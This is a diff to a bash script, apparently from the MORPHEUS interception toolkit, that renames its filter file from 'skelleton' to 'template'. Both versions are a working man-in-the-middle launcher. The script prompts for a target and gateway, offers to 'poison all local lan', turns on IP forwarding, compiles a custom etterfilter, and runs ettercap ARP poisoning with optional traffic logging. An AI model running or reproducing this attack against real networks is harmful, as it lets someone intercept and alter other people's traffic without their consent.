@@ -274,15 +274,15 @@ rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank t
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
-  cp $IPATH/filters/skelleton.eft $IPATH/filters/skelleton.bk > /dev/null 2>&1
+  cp $IPATH/filters/template.eft $IPATH/filters/template.bk > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Edit skelleton '(filter)'${RedF}!${Reset};  
-  xterm -T "MORPHEUS - skelleton filter" -geometry 115x36 -e "nano $IPATH/filters/skelleton.eft"
+  echo ${BlueF}[☠]${white} Edit template '(filter)'${RedF}!${Reset};  
+  xterm -T "MORPHEUS - template filter" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
-    # compiling skelleton.eft to be used in ettercap
-    echo ${BlueF}[☠]${white} Compiling skelleton${RedF}!${Reset};
-    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
+    # compiling template.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
+    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
     sleep 1
     # port-forward
     echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -295,28 +295,28 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
         fi
       fi
     
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
-  mv $IPATH/filters/skelleton.bk $IPATH/filters/skelleton.eft > /dev/null 2>&1
-  rm $IPATH/output/skelleton.ef > /dev/null 2>&1
+  mv $IPATH/filters/template.bk $IPATH/filters/template.eft > /dev/null 2>&1
+  rm $IPATH/output/template.ef > /dev/null 2>&1
   # port-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
